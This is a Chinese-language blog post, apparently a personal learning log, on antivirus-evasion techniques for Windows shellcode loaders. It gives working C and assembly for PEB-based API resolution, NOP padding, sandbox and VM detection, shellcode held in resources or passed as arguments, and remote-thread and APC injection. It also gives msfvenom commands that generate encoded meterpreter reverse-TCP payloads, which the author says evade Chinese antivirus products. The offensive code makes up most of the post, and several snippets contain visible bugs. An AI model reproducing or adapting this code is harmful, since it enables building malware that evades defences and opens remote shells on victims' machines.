# 0x00

作为一个web狗，对免杀这块是一直没办法深入学习，在恶补了些二进制基础后，开启了我的免杀之路(doge)

# 0x01 shellcode混淆

网上的免杀教程基本都会提的一个概念，把shellcode进行混淆从而避免杀软的检测，是在静态检测层面的bypass

混淆的方法有很多，Base64 异或 自定义加解密算法各种乱七八糟的组合起来，脑洞大或者多尝试基本可以bypass杀软对 shellcode 的静态检测

# 0x02 去除导入表中的敏感函数信息

有的杀软会对可执行文件中的导入表进行检查里面有无敏感函数(比如 VirtualAlloc)，检查到了就做出警告或者直接杀掉可执行文件

可以通过函数指针的方式去调用函数，这样在导入表里面是没有通过函数指针调用的函数信息的，自然也就bypass杀软对导入表的检测了，可以通过下面的代码获取VirtualAlloc函数的地址

    
    
    HMODULE hModule =LoadLibrary(_T("Kernel32.dll"));  
    GetProcAddress(hModule,"VirtualAlloc");

上面的代码中用到了LoadLibrary函数，而这个函数也是有些杀软盯紧的函数呢，那么我们还可以通过PEB来获取到要加载的DLL地址

三环的FS段寄存器指向TEB结构体，TEB[0x30]指向对应的PEB结构体，PEB[0x0c]指向PEB_LDR_DATA结构体，PEB_LDR_DATA[0x1c]是PEB_LDR_DATA.InInitializationOrderModuleList成员，这个成员是一个LIST_ENTRY结构体，LIST_ENTRY结构体的两个成员都指向LIST_ENTRY，其实就是构成一个双向链表，这个双向链表串着进程模块初始化的顺序

![](https://image.3001.net/images/20220717/1658029653_62d386558b52107633b84.png!small)  

通过上面说的双向链表就能找到Kernel32模块的地址，实现代码如下

    
    
    _asm {  
    mov esi, fs:[0x30]  //获得PEB结构体首地址  
    mov esi, [esi + 0xc]  //获得PEB_LDR_DATA结构体首地址  
    mov esi, [esi + 0x1c]  //获得LIST_ENTRY结构体首地址  
    mov esi, [esi]  //沿着链表往下找  
    mov esi, [esi]  
    mov esi, [esi + 0x8]  //Kernel32.dll模块的地址  
    mov hModule, esi  
    }

这样就实现了LoadLibrary函数的作用，绕过杀软的检测

上面的代码可能也会被检测，那么加一些NOP指令

    
    
    _asm {  
    mov esi, fs:[0x30]  //获得PEB结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0xc]  //获得PEB_LDR_DATA结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0x1c]  //获得LIST_ENTRY结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi]  //沿着链表往下找  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi]  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0x8]  //Kernel32.dll模块的地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov hModule, esi  
    }

`msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp lhost=x
lport=x -f exe`生成的shellcode就是通过遍历双向链表的方法找到需要加载的模块地址的

都没对shellcode进行混淆处理就bypasss火绒 360了(`msfvenom -p windows/meterpreter/reverse_tcp
-e x86/shikata_ga_nai -i 6 -b '\x00' lhost=x lport=x -f c -o shell.c`)

![](https://image.3001.net/images/20220717/1658029702_62d3868624fcd43fe4200.png!small)  

# 0x03 反沙箱

很多杀软都会把可执行文件上传到云沙箱里面进行模拟可执行文件的执行，观察可执行文件执行后的行为来判断可执行文件是否为恶意文件

我们需要在可执行文件逻辑里检测当前环境是否为云沙箱或者虚拟机环境，如果是则执行一些正常的代码逻辑，如果不是才执行我们的shellcode，这是一种对抗杀软云沙箱或者人工手动放虚拟机执行的一种方案

## 0x030 检测父进程是否为explore

我们平时在桌面上点击一个可执行文件的时候，可执行文件进程是由explore进程(桌面进程)进行创建出来的，explore进程就是可执行文件进程的父进程

对应的我们就可以通过检测可执行文件的父进程是否为explore进程来判断当前是否为沙箱环境

完整代码

    
    
    #include <stdio.h>  
    #include <Windows.h>  
    #include "tlhelp32.h"  
    ​  
    HMODULE hKernel32HMODULE;  
    unsigned char buf[] = "";  
    ​  
    /*  
    获取一个进程的父进程  
    */  
    DWORD GetParentProcessId(DWORD PID){  
    PROCESSENTRY32 pe32;  
    DWORD ParentProcessId = -1;  
    typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD dwFlags,DWORD th32ProcessID);  
    pCreateToolhelp32Snapshot CreateToolhelp32Snapshot;  
    CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32HMODULE,"CreateToolhelp32Snapshot");  
    if(CreateToolhelp32Snapshot == NULL){  
    printf("GetParentProcessId error...");  
    getchar();  
    exit(-1);  
    }else{  
    HANDLE handle = CreateToolhelp32Snapshot(2,0);  
    BOOL bMore = Process32First(handle,&pe32);  
    while(bMore){  
    if(pe32.th32ParentProcessID == PID){  
    ParentProcessId = pe32.th32ParentProcessID;  
    break;  
    }else{  
    bMore = Process32Next(handle,&pe32);  
    }  
    }  
    }  
    return ParentProcessId;  
    }  
    ​  
    /*  
    获取explorer进程的PID  
    */  
    DWORD GetexplorerProcessId(){  
    PROCESSENTRY32 pe32;  
    DWORD explorerProcessId = -1;  
    typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD dwFlags,DWORD th32ProcessID);  
    pCreateToolhelp32Snapshot CreateToolhelp32Snapshot;  
    CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32HMODULE,"CreateToolhelp32Snapshot");  
    if(CreateToolhelp32Snapshot == NULL){  
    printf("GetexplorerProcessId error...");  
    getchar();  
    exit(-1);  
    }else{  
    HANDLE handle = CreateToolhelp32Snapshot(2,0);  
    BOOL bMore = Process32First(handle,&pe32);  
    while(bMore){  
    if(_stricmp((CHAR*)pe32.szExeFile,"explorer.exe") == 0){  
    explorerProcessId = pe32.th32ProcessID;  
    break;  
    }else{  
    bMore = Process32Next(handle,&pe32);  
    }  
    }  
    }  
    return explorerProcessId;  
    }  
    ​  
    int main(){  
    typedef VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD  flAllocationType, DWORD flProtect);  
    pVirtualAlloc VirtualAlloc;  
    //HMODULE hModule;  
    _asm {  
    mov esi, fs:[0x30]  //获得PEB结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0xc]  //获得PEB_LDR_DATA结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0x1c]  //获得LIST_ENTRY结构体首地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi]  //沿着链表往下找  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi]  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0x8]  //Kernel32.dll模块的地址  
    NOP  
    NOP  
    NOP  
    NOP  
    mov hKernel32HMODULE, esi  
    }  
    DWORD explorerProcessId = GetexplorerProcessId();  
    DWORD ParentProcessId = GetParentProcessId(GetCurrentProcessId());  
    if(explorerProcessId != ParentProcessId){  
    printf("HelloWorld");  
    getchar();  
    return 0;  
    }  
    VirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32HMODULE,"VirtualAlloc");  
    char* memoryptr = (char*)VirtualAlloc(NULL,sizeof(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);  
    memcpy(memoryptr,&buf,sizeof(buf));  
    ((void(*)(void))memoryptr)();  
    return 0;  
    }

## 0x031 检测硬件资源

检测运行可执行文件时的环境，要求环境需达到一定的配置，像我平时使用虚拟机磁盘内存都不会给到100G这么大，下面的代码就要求总核数至少为2/内存至少2G/磁盘大小至少/100G

    
    
    /*  
    通过检测硬件资源来反沙箱()  
    */  
    BOOL CheckHardwareResources(){  
    SYSTEM_INFO systemInfo;  
    GetSystemInfo(&systemInfo);  
    //需要环境至少有两个内核  
    if(systemInfo.dwNumberOfProcessors < 2){  
    printf("dwNumberOfProcessors\n");  
    getchar();  
    return false;  
    }  
    MEMORYSTATUSEX MemStat;  
    MemStat.dwLength = sizeof(MEMORYSTATUSEX);  
    GlobalMemoryStatusEx(&MemStat);  
    DWORD totalMemory = MemStat.ullTotalPageFile / 1024 /1024;  
    //需要环境至少有2G内存  
    if(totalMemory < 2048){  
    printf("totalMemory\n");  
    getchar();  
    return false;  
    }  
    HANDLE hDevice = CreateFileW(TEXT("\\\\.\\PhysicalDrive0"),0,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);  
    DISK_GEOMETRY pDiskGeometry;  
    DWORD bytesReturned;  
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);  
    DWORD diskSizeGB;  
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;  
    //需要环境磁盘容量至少100G  
    if(diskSizeGB < 100){  
    printf("diskSizeGB\n");  
    getchar();  
    return false;  
    }  
    return true;  
    }

## 0x032 检测虚拟机特征值

### 0x0320 检测是否存在 `\\Device\\VBoxGuest`设备文件

当运行可执行文件的环境存在 `\\Device\\VBoxGuest`设备文件时，则认为此环境是虚拟机环境

下面的代码就是尝试打开 `\\Device\\VBoxGuest`设备文件，检查是否打开成功

    
    
    /*  
    检测是否存在\\Device\\VBoxGuest设备文件(有文件包含有问题,bug后面再调)  
    */  
    #include <winternl.h>  
    BOOL CheckVBoxGuest(){  
    OBJECT_ATTRIBUTES objectAttributes;  
    UNICODE_STRING uDeviceName;  
    RtlSecureZeroMemory(&uDeviceName,sizeof(uDeviceName));  
    RtlInitUnicodeString(&uDeviceName,TEXT("\\Device\\VBoxGuest"));  
    InitializeObjectAttributes(&objectAttributes,&uDeviceName,OBJ_CASE_INSENSITIVE,0,NULL);  
    HANDLE hDevice = NULL;  
    IO_STATUS_BLOCK ioStatusBlock;  
    NtCreateFile(&hDevice,GENERIC_READ,&GENERIC_READ,&ioStatusBlock,NULL,0,0,FILE_OPEN,0,NULL,0);  
    if(NT_SUCCESS(status)){  
    return false;  
    }  
    return true;  
    }

### 0x0321 检测是否存在设备名包含 VBOX 关键字或者 VMWARE 关键字

可以检测运行环境是否存在设备名包含 VBOX 关键字或者 VMWARE
关键字的设备来判断是否为虚拟机环境，如果存在则认为是虚拟机环境，不存在则不是虚拟机环境

下面的代码检测是否存在设备名包含 VBOX 关键字或者 VMWARE 关键字的设备

    
    
    /*  
    检测是否存在设备名包含 VBOX 关键字或者 VMWARE 关键字  
    */  
    #include <setupapi.h> 需要在项目的附加依赖项加上setupapi.lib  
    #include <devguid.h>  
    BOOL CheckVBOX(){  
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE,0,0,DIGCF_PRESENT);  
    SP_DEVINFO_DATA deviceInfoData;  
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);  
    SetupDiEnumDeviceInfo(hDeviceInfo,0,&deviceInfoData);  
    DWORD propertyBufferSize;  
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo,&deviceInfoData,SPDRP_FRIENDLYNAME,NULL,NULL,0,&propertyBufferSize);  
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,HEAP_ZERO_MEMORY);  
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo,&deviceInfoData,SPDRP_FRIENDLYNAME,NULL,(PBYTE)HDDName,propertyBufferSize,NULL);  
    CharUpperW(HDDName);  
    if(wcsstr(HDDName,TEXT("VBOX") || wcsstr(HDDName,TEXT("VMWARE")){  
    return false;  
    }  
    return true;  
    } 

### 0x0322 检测虚拟机中特有的进程

使用Vmware和VirtualBox创建的虚拟机会有一些特定的进程，这些进程是在物理机中没有的，这样就可以检测运行时的环境是否存在这些进程，存在这些进程则为虚拟机环境，否则为物理机环境

Vmware可以检测Vmtoolsd.exe/Vmwaretrat.exe/Vmwareuser.exe/Vmacthlp.exe进程；Vmacthlp.exe可以检测vboxservice.exe/vboxtray.exe进程

检测Vmware创建的虚拟机的特定进程代码

    
    
    /*  
    检测是否存在Vmware创建的虚拟机特有的进程  
    */  
    BOOL CheckVmwareProcess(){  
    const char* list[4] = { "vmtoolsd.exe","vmwaretrat.exe","vmwareuser.exe","vmacthlp.exe"};  
    PROCESSENTRY32 pe32;  
    pe32.dwSize = sizeof(PROCESSENTRY32);  
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);  
    BOOL bResult = Process32First(hProcessSnap,&pe32);  
    while(bResult){  
    char ss_Name[MAX_PATH] = {0};  
    WideCharToMultiByte(CP_ACP,0,pe32.szExeFile,-1,ss_Name,sizeof(ss_Name),NULL,NULL);  
    for (int i = 0; i <4; i++) {  
    if (strcmp(ss_Name,list[i]) == 0){  
    printf("%s process exist...\n",list[i]);  
    getchar();  
    return false;  
    }  
    }  
    bResult = Process32Next(hProcessSnap,&pe32);  
    }  
    return true;  
    }

### 0x0323 检测是否存在虚拟机特有的注册表键值

使用Vmware和VirtualBox创建的虚拟机在注册表里面会有一些特定的键值，而这些键值在物理机的注册表中是没有的，那么就可以检测是否存在虚拟机特有的注册表键值，如果存在则判断为虚拟机环境，否则就不是虚拟机环境

Vmware创建的虚拟机特有的键值

    
    
    HKLM\SOFTWARE\Vmware Inc\Vmware Tools  
    HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe

VirtualBox创建的虚拟机特有的键值

    
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions  
    HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier

检测Vmware创建的虚拟机的特定键值代码

    
    
    /*  
    检测是否存在HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe键值  
    */  
    BOOL CheckVmwareRegistryKey(){  
    HKEY hkey;  
    CString KeyStr;  
    KeyStr = TEXT("\\Applications\\VMwareHostOpen.exe");  
    if(RegOpenKey(HKEY_CLASSES_ROOT,KeyStr,&hkey) == ERROR_SUCCESS){  
    printf("\\Applications\\VMwareHostOpen.exe RegistryKey exist...");  
    getchar();  
    return false;  
    }  
    return true;  
    }

### 0x0324 检测是否存在虚拟机特有的文件

使用Vmware和VirtualBox创建的虚拟机会有一些特有的文件，而这些文件是在物理机中没有的，那么我们就可以检测是否存在这些文件，如果存在这些文件则判断为虚拟机，否则为物理机

Vmware创建的虚拟机特有的文件

    
    
    C:\windows\System32\Drivers\Vmmouse.sys  
    C:\windows\System32\Drivers\vmtray.dll  
    C:\windows\System32\Drivers\VMToolsHook.dll  
    C:\windows\System32\Drivers\vmmousever.dll  
    C:\windows\System32\Drivers\vmhgfs.dll  
    C:\windows\System32\Drivers\vmGuestLib.dll

VirtualBox创建的虚拟机特有的文件

    
    
    C:\windows\System32\Drivers\VBoxMouse.sys  
    C:\windows\System32\Drivers\VBoxGuest.sys  
    C:\windows\System32\Drivers\VBoxSF.sys  
    C:\windows\System32\Drivers\VBoxVideo.sys  
    C:\windows\System32\vboxdisp.dll  
    C:\windows\System32\vboxhook.dll  
    C:\windows\System32\vboxoglerrorspu.dll  
    C:\windows\System32\vboxoglpassthroughspu.dll  
    C:\windows\System32\vboxservice.exe  
    C:\windows\System32\vboxtray.exe  
    C:\windows\System32\VBoxControl.exe

检测Vmware创建的虚拟机特有的文件代码

    
    
    /*  
    检测是否存在Vmware创建的虚拟机特有的文件  
    */  
    BOOL CheckVmwareFile(){  
    if(access("C:\\windows\\System32\\Drivers\\Vmmouse.sys",0) == 0){  
    printf("Vmware File exist...");  
    getchar();  
    return false;  
    }  
    return true;  
    }

## 0x033 检测系统环境启动时间

当我们的可执行文件被放到沙盒中执行的时候，大概率沙盒环境是刚刚启动的，那么就可以判断当前系统环境的启动时间，如果启动时间过短则判断为沙盒环境，否则为物理机环境（但是我觉得这个反虚拟机不太合适，我一般虚拟机都是挂起状态的，那么启动时间肯定不会过短

检测代码

    
    
    /*  
    检测系统启动时间  
    */  
    BOOL CheckSystemStartTime(){  
    ULONGLONG uptime = GetTickCount64();  
    if(uptime < 1200){  
    printf("SystemStartTime < 1200");  
    getchar();  
    return false;  
    }  
    return true;  
    }

个人认为这个方法有点鸡肋

## 0x034 根据微步沙箱特征来反沙箱

微步沙箱的壁纸路径为
`C:\Users\vbccsb\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper.jpg`；且壁纸文件HASH为
`1645643018`，而微步沙箱的壁纸都是不变的，那么就可以在程序逻辑里检测当前环境的壁纸是否为微步沙箱特有的壁纸来判断是否为沙箱环境。

# 0x04 把shellcode放到资源文件里面

咋们把shellcode放到全局变量中时，shellcode是在PE结构里的 .data
节里面的，而我们把shellcode放到资源文件中时，shellcode是在PE结构里的 .rsrc 节里面的，可能杀软静态查杀的时候检测了 .data
节里面的内容而没有检测 .rsrc 节里面的内容，那么把shellcode放到资源文件中就可以绕过杀软的静态查杀

直接导入shellcode.txt文件到资源里面就可以了，资源类型自己随便定义，后面找到该资源需要这个资源类型

![](https://image.3001.net/images/20220717/1658029751_62d386b7c32a5c8c696fa.png!small)

获取项目中的资源并加载进内存中(就是把资源中的shellcode加载进内存中)，然后执行

我这里的shellcode.txt是用的 `msfvenom -p windows/meterpreter/reverse_tcp -e
x86/shikata_ga_nai -i 6 -b '\x00' lhost=x lport=x -f c -o shell.c
`shellcode（去除\x）

实现代码

    
    
    #include <Windows.h>  
    #include <stdio.h>  
    #include "resource.h"  
      
    int asciitable[] = {  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,1,2,  
    3,4,5,6,7,8,9,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0xa,0xb,0xc,0xd,  
    0xe,0xf,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0  
    };  
      
    int main(){  
    HRSRC shellcodeResource = FindResource(NULL,MAKEINTRESOURCE(IDR_SHELLCODE1),TEXT("shellcode"));  
    DWORD shellcodeSize = SizeofResource(NULL,shellcodeResource);  
    HGLOBAL shellcodeResouceData = LoadResource(NULL,shellcodeResource);  
    char* exec = (char*)VirtualAlloc(0,shellcodeSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);  
    memcpy(exec,shellcodeResouceData,shellcodeSize);  
    char a;  
    unsigned int i = 0;  
    for(;i < shellcodeSize;i++){  
    a = asciitable[(*(exec+i*2))-1]*0x10+asciitable[(*(exec+i*2+1))-1];  
    memcpy(exec+i,&a,1);  
    }  
    ((void(*)())exec)();  
    return 0;  
    }

# 0x05 shellcode分离

shellcode分离也就是不要直接在硬编码里面存shellcode，而是通过传参的方式或者读取远程文件的方式获取到shellcode，再进行shellcode的执行

shellcode分离的核心思想就是不要把shellcode存在硬编码里面，这样也bypass杀软就对shellcode的检测了

shellcode分离也有局限的地方，比如目标不出网，而我们想钓鱼的话参数又传不进去，这时候怎么把shellcode加载到可执行文件的虚拟4GB内存中呢？

最简单的一个shellcode分离加载

    
    
    #include <Windows.h>  
    #include <stdio.h>  
    #include "resource.h"  
      
    int asciitable[] = {  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,1,2,  
    3,4,5,6,7,8,9,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0xa,0xb,0xc,0xd,  
    0xe,0xf,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0,0,0,0,  
    0,0,0,0,0,0,0  
    };  
      
    int main(int argc,char* argv[]){  
    char* shellcode = argv[1];  
    DWORD shellcodeSize = strlen(argv[1]);  
    char* exec = (char*)VirtualAlloc(0,shellcodeSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);  
    memcpy(exec,shellcode,shellcodeSize);  
    char a;  
    unsigned int i = 0;  
    for(;i < shellcodeSize;i++){  
    a = asciitable[(*(exec+i*2))-1]*0x10+asciitable[(*(exec+i*2+1))-1];  
    memcpy(exec+i,&a,1);  
    }  
    ((void(*)())exec)();  
    return 0;  
    }

# 0x06 远程线程注入

远程线程注入就是用
`VirtualAllocEx()`函数在另一个进程上开辟一块有可读/写/执行权限的空间，然后用`WriteProcessMemory()`函数把shellcode写到开辟的空间里面，最后再用
`WriteProcessMemory()`函数在远程进程中创建一个线程用以执行写进去的 shellcode

实现代码

    
    
    #include <Windows.h>  
    #include <stdio.h>  
      
    unsigned char buf[] = "";  
      
    int main(){  
    STARTUPINFO lpStartupInfo;  
    lpStartupInfo.cb = sizeof(STARTUPINFO);  
    ZeroMemory(&lpStartupInfo,sizeof(STARTUPINFO));  
    PROCESS_INFORMATION lpProcessInformation;  
    ZeroMemory(&lpProcessInformation,sizeof(PROCESS_INFORMATION));  
    if(!CreateProcess(TEXT("C:\\Windows\\System32\\nslookup.exe"),NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&lpStartupInfo,&lpProcessInformation)){  
    printf("CreateProcess error...");  
    DWORD ErrorCode = GetLastError();  
    printf("%d",ErrorCode);  
    getchar();  
    exit(-1);  
    }  
    LPVOID AllocAddress = VirtualAllocEx(lpProcessInformation.hProcess,NULL,sizeof(buf),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);  
    WriteProcessMemory(lpProcessInformation.hProcess,AllocAddress,buf,sizeof(buf),NULL);  
    CreateRemoteThread(lpProcessInformation.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)AllocAddress,NULL,0,0);  
    system("pause");  
    return 0;  
    }

上面的代码是把 shellcode 注入到自己创建的一个进程里面；实际情况下也可以遍历当前操作系统的所有进程，然后选择一个合适的进程进行注入

# 0x07 APC注入

线程在极端的情况下是无法被杀死的，这时候如果想改变一个线程的行为，可以给线程一个函数，让线程自己调用函数，这个函数就是由APC进行指定的

APC注入就是往线程APC队列里面插入一个APC，那么线程就会产生
系统调用/异常/中断（比如在三环调用SleepEx、SignalObjectAndWait、WaitForSingleObjectEx、WaitForMultipleObjectsEx、MsgWaitForMultipleObjectsEx
函数都可以使线程执行用户APC队列中的函数）
时执行插入的APC指定的函数，可以通过QueueUserAPC函数向一个线程APC队列中插入一个APC，插入到的队列是用户APC队列

实现代码

    
    
    #include <Windows.h>  
    #include <stdio.h>  
      
    unsigned char buf[] = "";  
      
    int main(){  
    STARTUPINFO lpStartupInfo;  
    lpStartupInfo.cb = sizeof(STARTUPINFO);  
    ZeroMemory(&lpStartupInfo,sizeof(STARTUPINFO));  
    PROCESS_INFORMATION lpProcessInformation;  
    ZeroMemory(&lpProcessInformation,sizeof(PROCESS_INFORMATION));  
    if(!CreateProcess(TEXT("C:\\Windows\\System32\\nslookup.exe"),NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&lpStartupInfo,&lpProcessInformation)){  
    printf("CreateProcess error...");  
    DWORD ErrorCode = GetLastError();  
    printf("%d",ErrorCode);  
    getchar();  
    exit(-1);  
    }  
    LPVOID AllocAddress = VirtualAllocEx(lpProcessInformation.hProcess,NULL,sizeof(buf),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);  
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)AllocAddress;  
    printf("%x\n",lpProcessInformation.dwProcessId);  
    WriteProcessMemory(lpProcessInformation.hProcess,AllocAddress,buf,sizeof(buf),NULL);  
    if(!QueueUserAPC((PAPCFUNC)apcRoutine,lpProcessInformation.hThread,NULL)){  
    printf("QueueUserAPC error...");  
    getchar();  
    }  
    SleepEx(1000*600,TRUE);  
    getchar();  
    return 0;  
    }

QueueUserAPC函数的调用栈是`QueueUserAPC->NtQueueApcThread->KeInitializeApc(初始化APC结构体)->KeInsertQueueApc->KiInsertQueueApc(将APC结构体插入到指定的APC队列中)`

那么其实不用QueueUserAPC函数也可以，只需要自己初始化一个APC结构体，然后自己插入APC，实现起来麻烦一些，不过效果也更好

# 0x08 加花指令

加花指令可以绕过一些杀软的静态检测，比如杀软检测下面一段指令

    
    
    mov esi, fs:[0x30]  
    mov esi, [esi + 0xc]

那么只需要在中间加一些花指令即可

    
    
    mov esi, fs:[0x30]  
    NOP  
    NOP  
    NOP  
    NOP  
    mov esi, [esi + 0xc]

花指令也可以反反汇编，让反汇编器出错，让逆向分析程序者的分析工作大量增加，增大程序被逆向的难度，但是花指令不会影响程序的正常执行；网上的花指令文章很多，自行百度即可

# 0x09 使用其它API代替敏感API

一些杀软会通过HOOK技术来检测程序是否使用了敏感API函数如CreateThread等，检测到了就采取一定的预警措施；那么我们可以把敏感API替换为相同功能的API函数，例如CreateThread函数就可以用SetTimer函数去替换；除了
SetTimer 外，LdapUTF8ToUnicode/UuidFromStringA等函数也可以在免杀中用到。

更多执行shellcode的方法：<https://github.com/aahmad097/AlternativeShellcodeExec>

# 0x10 DLL劫持加载shellcode

在网上瞎逛看到的一篇文章讲的是用DLL劫持来加载 shellcode，而这个方法竟然能过国内某杀软，感觉很怪就记录一下这个思路，具体实现参考后面文章

# 0x11 参考

<https://bbs.pediy.com/thread-271207-1.htm#msg_header_h3_8>

<http://t.zoukankan.com/theseventhson-p-13199381.html>

<https://blog.csdn.net/Captain_RB/article/details/123858864>

<https://bbs.pediy.com/thread-263668.htm>

